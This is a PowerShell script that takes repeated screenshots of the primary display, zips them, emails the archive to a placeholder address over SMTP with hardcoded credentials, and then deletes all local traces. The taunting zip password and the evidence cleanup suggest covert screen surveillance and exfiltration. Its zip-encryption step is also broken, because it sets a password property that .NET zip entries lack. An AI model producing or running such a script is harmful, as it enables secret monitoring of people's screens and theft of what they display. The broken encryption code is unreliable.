param (
    [string]$screenshotPath = "C:\Users\YourUsername\Screenshots",
    [string]$zipFilePath = "C:\Users\YourUsername\Screenshots.zip",
    [string]$emailTo = "your-email@example.com",
    [string]$emailFrom = "your-email2@example.com",
    [string]$smtpServer = "smtp.example.com",
    [string]$smtpUsername = "your-email@example.com",
    [string]$smtpPassword = "your-email-password",
    [string]$zipPassword = "YoUsUcK!"
)

# Create screenshots folder if it doesn't exist
if (-Not (Test-Path $screenshotPath)) {
    New-Item -ItemType Directory -Path $screenshotPath
}

# Function to capture screenshot
function Capture-Screenshot {
    param (
        [string]$filePath
    )
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
}

# Capture multiple screenshots
for ($i = 1; $i -le 5; $i++) {
    $screenshotFile = "$screenshotPath\screenshot_$i.png"
    Capture-Screenshot -filePath $screenshotFile
    Start-Sleep -Seconds 5
}

# Zip the screenshots with a password
Compress-Archive -Path "$screenshotPath\*" -DestinationPath $zipFilePath
Add-Type -AssemblyName 'System.IO.Compression.FileSystem'
$zip = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Update')
foreach ($entry in $zip.Entries) {
    $entry.Password = $zipPassword
}
$zip.Dispose()

# Send the zip file via email
$smtp = New-Object System.Net.Mail.SmtpClient($smtpServer)
$smtp.Credentials = New-Object System.Net.NetworkCredential($smtpUsername, $smtpPassword)
$message = New-Object System.Net.Mail.MailMessage
$message.From = $emailFrom
$message.To.Add($emailTo)
$message.Subject = "Screenshots"
$message.Body = "Attached are the screenshots."
$attachment = New-Object System.Net.Mail.Attachment($zipFilePath)
$message.Attachments.Add($attachment)
$smtp.Send($message)

# Cleanup
Remove-Item -Path $screenshotPath -Recurse -Force
Remove-Item -Path $zipFilePath -Force
